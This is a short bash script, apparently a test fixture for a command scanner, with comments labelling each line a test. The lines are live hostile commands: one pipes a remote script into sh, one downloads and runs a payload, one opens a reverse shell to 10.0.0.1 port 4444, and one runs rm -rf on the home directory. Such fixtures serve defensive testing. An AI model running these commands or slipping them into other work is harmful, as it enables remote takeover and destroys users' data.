#!/bin/bash

# Test curl | sh
curl https://example.com/script.sh | sh

# Test wget
wget https://example.com/payload && chmod +x payload && ./payload

# Test reverse shell
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# Test dead man's switch
rm -rf $HOME